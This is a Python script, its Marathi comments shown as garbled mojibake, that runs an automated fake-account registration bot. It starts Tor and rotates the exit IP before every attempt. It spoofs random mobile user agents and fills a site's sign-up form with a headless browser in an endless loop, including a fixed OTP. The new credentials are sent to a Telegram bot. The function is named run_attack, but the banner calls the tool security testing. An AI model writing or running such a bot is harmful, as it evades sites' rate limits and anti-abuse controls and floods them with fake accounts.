import os
import random
import string
import time
import requests
import threading
import subprocess
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
from stem import Signal
from stem.control import Controller
from flask import Flask
from dotenv import load_dotenv

# ‡§ï‡•â‡§®‡•ç‡§´‡§ø‡§ó‡§∞‡•á‡§∂‡§® ‡§≤‡•ã‡§° ‡§ï‡§∞‡§æ
load_dotenv()
from config import *

app = Flask(__name__)

def send_telegram(message):
    """‡§ü‡•á‡§≤‡§ø‡§ó‡•ç‡§∞‡§æ‡§Æ‡§µ‡§∞ ‡§Ö‡§≤‡§∞‡•ç‡§ü ‡§™‡§æ‡§†‡§µ‡§æ"""
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    try:
        requests.post(url, json={"chat_id": TELEGRAM_CHAT_ID, "text": message})
        return True
    except Exception as e:
        print(f"‚úñÔ∏è Telegram error: {e}")
        return False

def start_tor():
    """Termux ‡§Æ‡§ß‡•ç‡§Ø‡•á TOR ‡§∏‡§∞‡•ç‡§µ‡•ç‡§π‡§∞ ‡§∏‡•Å‡§∞‡•Ç ‡§ï‡§∞‡§æ"""
    try:
        # TOR ‡§ï‡•â‡§®‡•ç‡§´‡§ø‡§ó‡§∞‡•á‡§∂‡§® ‡§§‡§Ø‡§æ‡§∞ ‡§ï‡§∞‡§æ
        with open("torrc", "w") as f:
            f.write("SocksPort 9050\nControlPort 9051\nCookieAuthentication 1")
        
        # TOR ‡§∏‡§∞‡•ç‡§µ‡•ç‡§π‡§∞ ‡§∏‡•Å‡§∞‡•Ç ‡§ï‡§∞‡§æ
        tor_process = subprocess.Popen(
            ["tor", "-f", "torrc"],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        print("‚úì TOR ‡§∏‡§∞‡•ç‡§µ‡•ç‡§π‡§∞ ‡§∏‡•Å‡§∞‡•Ç ‡§ù‡§æ‡§≤‡§æ")
        return tor_process
    except Exception as e:
        print(f"‚úñÔ∏è TOR ‡§∏‡•Å‡§∞‡•Ç ‡§ï‡§∞‡§£‡•ç‡§Ø‡§æ‡§§ ‡§Ö‡§Ø‡§∂‡§∏‡•ç‡§µ‡•Ä: {e}")
        return None

def rotate_tor_ip():
    """TOR IP ‡§Ö‡•Ö‡§°‡•ç‡§∞‡•á‡§∏ ‡§¨‡§¶‡§≤‡§æ"""
    try:
        with Controller.from_port(port=9051) as controller:
            controller.authenticate()
            controller.signal(Signal.NEWNYM)
        print("‚úì TOR IP ‡§¨‡§¶‡§≤‡§≤‡§æ")
        time.sleep(5)  # ‡§®‡§µ‡•Ä‡§® ‡§∏‡§∞‡•ç‡§ï‡§ø‡§ü ‡§∏‡•ç‡§•‡§æ‡§™‡§ø‡§§ ‡§π‡•ã‡§£‡•ç‡§Ø‡§æ‡§ö‡•Ä ‡§µ‡§æ‡§ü ‡§™‡§π‡§æ
        return True
    except Exception as e:
        print(f"‚úñÔ∏è TOR IP ‡§¨‡§¶‡§≤‡§£‡•ç‡§Ø‡§æ‡§§ ‡§Ö‡§Ø‡§∂‡§∏‡•ç‡§µ‡•Ä: {e}")
        return False

def get_tor_ip():
    """‡§∏‡§ß‡•ç‡§Ø‡§æ‡§ö‡§æ TOR IP ‡§™‡§§‡•ç‡§§‡§æ ‡§Æ‡§ø‡§≥‡§µ‡§æ"""
    try:
        session = requests.Session()
        session.proxies = {'http': 'socks5://127.0.0.1:9050'}
        return session.get("https://api.ipify.org", timeout=10).text
    except Exception:
        return "IP Unknown"

def generate_credentials():
    """‡§Ø‡•Å‡§®‡§ø‡§ï ‡§à‡§Æ‡•á‡§≤ ‡§Ü‡§£‡§ø ‡§™‡§æ‡§∏‡§µ‡§∞‡•ç‡§° ‡§§‡§Ø‡§æ‡§∞ ‡§ï‡§∞‡§æ"""
    username = ''.join(random.choices(string.ascii_lowercase, k=8))
    email = f"{username}@securitytest.com"
    password = ''.join(random.choices(string.ascii_letters + string.digits + '!@#$%', k=12))
    return email, password

def run_attack():
    """‡§Æ‡•Å‡§ñ‡•ç‡§Ø ‡§∏‡•Å‡§∞‡§ï‡•ç‡§∑‡§æ ‡§ö‡§æ‡§ö‡§£‡•Ä ‡§´‡§Ç‡§ï‡•ç‡§∂‡§®"""
    print("üîì ‡§∏‡•Å‡§∞‡§ï‡•ç‡§∑‡§æ ‡§ö‡§æ‡§ö‡§£‡•ç‡§Ø‡§æ ‡§∏‡•Å‡§∞‡•Ç ‡§π‡•ã‡§§ ‡§Ü‡§π‡•á‡§§...")
    while True:
        try:
            # ‡§®‡§µ‡•Ä‡§® ‡§ï‡•ç‡§∞‡•á‡§°‡•á‡§Ç‡§∂‡§ø‡§Ø‡§≤‡•ç‡§∏ ‡§§‡§Ø‡§æ‡§∞ ‡§ï‡§∞‡§æ
            email, password = generate_credentials()
            
            # TOR IP ‡§¨‡§¶‡§≤‡§æ
            rotate_tor_ip()
            current_ip = get_tor_ip()
            
            # ‡§¨‡•ç‡§∞‡§æ‡§â‡§ù‡§∞ ‡§ï‡•â‡§®‡•ç‡§´‡§ø‡§ó‡§∞ ‡§ï‡§∞‡§æ
            chrome_options = Options()
            chrome_options.add_argument("--headless=new")
            chrome_options.add_argument("--no-sandbox")
            chrome_options.add_argument("--disable-dev-shm-usage")
            chrome_options.add_argument("--proxy-server=socks5://127.0.0.1:9050")
            
            # ‡§Ø‡•Å‡§®‡§ø‡§ï ‡§Ø‡•Ç‡§ú‡§∞-‡§è‡§ú‡§Ç‡§ü
            user_agent = f"Mozilla/5.0 (Android {random.randint(10,14)}; Mobile; rv:109.0) Gecko/20100101 Firefox/{random.randint(100,120)}.0"
            chrome_options.add_argument(f"user-agent={user_agent}")
            
            # ChromeDriver ‡§≤‡§æ‡§Å‡§ö ‡§ï‡§∞‡§æ
            driver = webdriver.Chrome(
                executable_path=CHROMEDRIVER_PATH,
                options=chrome_options
            )
            
            # ‡§µ‡•á‡§¨‡§∏‡§æ‡§á‡§ü ‡§≤‡•ã‡§° ‡§ï‡§∞‡§æ
            driver.get(REGISTER_URL)
            time.sleep(2)
            
            # ‡§´‡•â‡§∞‡•ç‡§Æ ‡§≠‡§∞‡§æ
            driver.find_element(By.NAME, "email").send_keys(email)
            driver.find_element(By.NAME, "password").send_keys(password)
            driver.find_element(By.NAME, "otp").send_keys(TEST_OTP)
            
            # ‡§∏‡§¨‡§Æ‡§ø‡§ü ‡§ï‡§∞‡§æ
            driver.find_element(By.XPATH, "//button[@type='submit']").click()
            time.sleep(3)
            
            # ‡§ü‡•á‡§≤‡§ø‡§ó‡•ç‡§∞‡§æ‡§Æ‡§µ‡§∞ ‡§®‡§ø‡§ï‡§æ‡§≤ ‡§™‡§æ‡§†‡§µ‡§æ
            message = (
                "üî• ‡§®‡§µ‡•Ä‡§® ‡§Ö‡§ï‡§æ‡§â‡§Ç‡§ü ‡§§‡§Ø‡§æ‡§∞ ‡§ù‡§æ‡§≤‡•á!\n"
                "--------------------------------\n"
                f"üìß ‡§à‡§Æ‡•á‡§≤: `{email}`\n"
                f"üîë ‡§™‡§æ‡§∏‡§µ‡§∞‡•ç‡§°: `{password}`\n"
                f"üåê IP: `{current_ip}`\n"
                f"üÜî ‡§Ø‡•Ç‡§ú‡§∞-‡§è‡§ú‡§Ç‡§ü: `{user_agent}`\n"
                "--------------------------------\n"
                f"‚è±Ô∏è ‡§µ‡•á‡§≥: {time.strftime('%Y-%m-%d %H:%M:%S')}"
            )
            send_telegram(message)
            print(f"‚úì ‡§Ö‡§ï‡§æ‡§â‡§Ç‡§ü ‡§§‡§Ø‡§æ‡§∞ ‡§ù‡§æ‡§≤‡•á: {email}")
            
            # ‡§¨‡•ç‡§∞‡§æ‡§â‡§ù‡§∞ ‡§¨‡§Ç‡§¶ ‡§ï‡§∞‡§æ
            driver.quit()
            
            # ‡§∞‡§Å‡§°‡§Æ ‡§µ‡§ø‡§≤‡§Ç‡§¨
            sleep_time = random.randint(10, ATTACK_INTERVAL)
            print(f"‚è≥ ‡§™‡•Å‡§¢‡•Ä‡§≤ ‡§ö‡§æ‡§ö‡§£‡•Ä‡§∏‡§æ‡§†‡•Ä {sleep_time} ‡§∏‡•á‡§ï‡§Ç‡§¶ ‡§•‡§æ‡§Ç‡§¨‡§æ...")
            time.sleep(sleep_time)
            
        except Exception as e:
            error_msg = f"‚úñÔ∏è ‡§ö‡§æ‡§ö‡§£‡•Ä ‡§Ö‡§Ø‡§∂‡§∏‡•ç‡§µ‡•Ä: {str(e)}"
            print(error_msg)
            send_telegram(error_msg)
            time.sleep(10)

def start_flask_server():
    """Flask ‡§µ‡•á‡§¨ ‡§∏‡§∞‡•ç‡§µ‡•ç‡§π‡§∞ ‡§∏‡•Å‡§∞‡•Ç ‡§ï‡§∞‡§æ"""
    print(f"üåê Flask ‡§∏‡§∞‡•ç‡§µ‡•ç‡§π‡§∞ ‡§™‡•ã‡§∞‡•ç‡§ü {FLASK_PORT} ‡§µ‡§∞ ‡§∏‡•Å‡§∞‡•Ç ‡§π‡•ã‡§§ ‡§Ü‡§π‡•á...")
    app.run(host='0.0.0.0', port=FLASK_PORT)

if __name__ == "__main__":
    print("""
    ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó
    ‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ïê‚ïù‚ïö‚ñà‚ñà‚ïó‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ïê‚ïù
    ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó ‚ïö‚ñà‚ñà‚ñà‚ïî‚ïù ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó
    ‚ïö‚ïê‚ïê‚ïê‚ïê‚ñà‚ñà‚ïë ‚ñà‚ñà‚ïî‚ñà‚ñà‚ïó ‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ïù ‚ïö‚ïê‚ïê‚ïê‚ïê‚ñà‚ñà‚ïë
    ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ïù ‚ñà‚ñà‚ïó‚ñà‚ñà‚ïë     ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïë
    ‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïù‚ïö‚ïê‚ïù     ‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù
    ‡§∏‡•Å‡§∞‡§ï‡•ç‡§∑‡§æ ‡§ö‡§æ‡§ö‡§£‡•Ä ‡§™‡•ç‡§∞‡§£‡§æ‡§≤‡•Ä
    """)
    
    # TOR ‡§∏‡§∞‡•ç‡§µ‡•ç‡§π‡§∞ ‡§∏‡•Å‡§∞‡•Ç ‡§ï‡§∞‡§æ
    tor_process = start_tor()
    time.sleep(10)  # TOR ‡§∏‡•Å‡§∞‡•Ç ‡§π‡•ã‡§£‡•ç‡§Ø‡§æ‡§ö‡•Ä ‡§µ‡§æ‡§ü ‡§™‡§π‡§æ
    
    # Flask ‡§∏‡§∞‡•ç‡§µ‡•ç‡§π‡§∞ ‡§•‡•ç‡§∞‡•á‡§°‡§Æ‡§ß‡•ç‡§Ø‡•á ‡§∏‡•Å‡§∞‡•Ç ‡§ï‡§∞‡§æ
    flask_thread = threading.Thread(target=start_flask_server, daemon=True)
    flask_thread.start()
    
    # ‡§Ö‡§ü‡•Ö‡§ï ‡§•‡•ç‡§∞‡•á‡§° ‡§∏‡•Å‡§∞‡•Ç ‡§ï‡§∞‡§æ
    attack_thread = threading.Thread(target=run_attack, daemon=True)
    attack_thread.start()
    
    # ‡§Æ‡•Å‡§ñ‡•ç‡§Ø ‡§•‡•ç‡§∞‡•á‡§°‡§≤‡§æ ‡§∏‡§ï‡•ç‡§∞‡§ø‡§Ø ‡§†‡•á‡§µ‡§æ
    try:
        while True:
            time.sleep(3600)
    except KeyboardInterrupt:
        print("\nüõë ‡§∏‡§ø‡§∏‡•ç‡§ü‡•Ä‡§Æ ‡§¨‡§Ç‡§¶ ‡§ï‡§∞‡§§ ‡§Ü‡§π‡•á...")
        if tor_process:
            tor_process.terminate()
        print("‚úÖ ‡§∏‡§∞‡•ç‡§µ ‡§™‡•ç‡§∞‡§ï‡•ç‡§∞‡§ø‡§Ø‡§æ ‡§¨‡§Ç‡§¶ ‡§ù‡§æ‡§≤‡•ç‡§Ø‡§æ")
